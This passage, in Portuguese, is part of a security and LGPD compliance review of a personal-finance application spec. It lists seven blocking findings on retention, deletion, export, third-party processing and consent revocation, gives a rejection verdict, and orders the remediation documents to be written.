**Aprovado sem ressalva (registro do que está certo, para não ser re-litigado):** RLS com `FORCE` e `WITH CHECK`; `SET LOCAL` por transação; nenhum papel de requisição com `BYPASSRLS`; segunda camada de filtro; UUID v4; teste de dois tenants obrigatório por rota; keyset em vez de `OFFSET`; idempotência de ingestão por `(tenant_id, provider, external_id)` + hash; `auditoria` append-only por `REVOKE`; recusa de geolocalização; recusa de exibir credencial em qualquer circunstância.

## C.2 `especialista-lgpd-compliance` — ⛔ **REPROVADO**

Há sinais claros de intenção correta — `consentimentos` append-only e versionado, `exportacoes` como tabela, Atividades exposta ao titular, "Começar do zero", recusa de reconexão silenciosa, recusa de geolocalização, categorização sempre reversível com motivo visível. Mas conformidade não é intenção: das ~30 classes de dado pessoal do spec, duas têm prazo declarado, nenhuma tem mecanismo de descarte, a maioria das entidades não aparece em exportação nem em eliminação, e o job que aplicaria a retenção converge para um estado alvo que nenhum documento define.

**Bloqueios:**

| # | Achado | Item de veto acionado |
|---|---|---|
| 1 | **B-01** — nenhuma política de retenção; `retencao.aplicar` sem estado alvo definido | *Dado sem prazo de retenção e sem mecanismo de descarte* |
| 2 | **B-03** — nenhum mecanismo de eliminação: sem rota, sem job, sem definição; colisão não resolvida entre soft delete (regra 17), auditoria append-only (regra 18) e o art. 18 VI | *Dado sem mecanismo de descarte* |
| 3 | **B-02** — exportação não enumera entidades; ~18 entidades ausentes dos dois fluxos, incluindo `Objetivo`, `Aporte`, `Planejamento`, `Conexao`, `LancamentoBruto` e as atividades | *Entidade nova ausente dos fluxos de exportação e eliminação* |
| 4 | **B-11 / B-12** — categorização por IA e OCR sem declarar se há terceiro, sem contrato de operador, sem ciência do titular, sem registro; e "métrica offline" sugere treinamento com dado de cliente sem base própria | *Envio de dado pessoal a terceiro sem contrato, sem ciência do titular ou sem registro* |
| 5 | **B-14 / B-15 / B-16** — revogação não apaga credencial, não é síncrona, não invalida o acesso no provider, e não dá escolha ao titular sobre o histórico já sincronizado; ADR conjunta com `especialista-open-finance` inexistente | *Consentimento cuja revogação não tem efeito técnico* |
| 6 | **B-04 / B-05** — log de atividades "permanente", sem base legal escrita (LIA), duplicando conteúdo financeiro, e sem nenhum caminho técnico de pseudonimização por causa do próprio append-only | *Dado sem prazo; "para sempre" não é prazo* |
| 7 | **B-07** — `lancamentos_brutos.payload` guarda dado cru de terceiros (chave Pix, agência, conta) sem prazo e sem minimização | *Coleta sem necessidade; dado sem prazo* |

**Ressalvas de alta prioridade que não bloqueiam o MVP** (épico 10 e adiante, mas decididas agora porque retrofit é caro): B-08, B-09 e B-10 — o termo de aceite do compartilhamento familiar e o efeito da saída de um membro.

## C.3 Consolidado

# ⛔ REPROVADO

O gate cumpriu sua função: os 8 bloqueios de AppSec e os 7 de LGPD custam, agora, dias de escrita de spec e de ADR. Descobertos depois de implementados, custam a reescrita da ingestão, da autorização e da criptografia — e, no caso de A-32 somado a A-37, custariam o produto.

**Caminho para reavaliação, na ordem de dependência:**

1. **ADR 0018** (envelope encryption: algoritmo, AAD, `kek_versao`, rotação, backup, crypto-shredding) — destrava A-37, B-14 e parte de B-03.
2. **`docs/arquitetura/autorizacao.md`** (matriz papel × ação × recurso, com guard que nega por padrão) — destrava A-12, A-19, A-20, A-26, A-27.
3. **`docs/lgpd/retencao.md`** + `docs/lgpd/eliminacao.md` + LIA da auditoria — destrava B-01, B-03, B-04, B-05, B-07.
4. **Spec de upload** (limites numéricos, XXE, descompressão, sandbox de parsing/OCR) — destrava A-32, A-33, A-34, A-36.
5. **`zEscopoExportacao`** enumerando todas as entidades, com o teste que quebra o build quando uma tabela nova não é declarada — destrava B-02 e o mantém destravado.
6. **Contratos faltantes** em `packages/contracts`: `sync`, `anexos`, `inteligencia`, `mcp`, `chaves_api` — destrava A-29, A-30, A-31, A-40.
7. **ADR conjunta com `especialista-open-finance`** sobre dados já sincronizados após revogação — destrava B-15 e B-16.

Os 22 casos de abuso de §A.8 vão para o `engenheiro-qa-automacao` **junto com** os tickets, não depois deles. Nenhum seam novo é necessário: todos cabem em S1, S2, S3 e S4. Um controle sem teste é uma intenção.
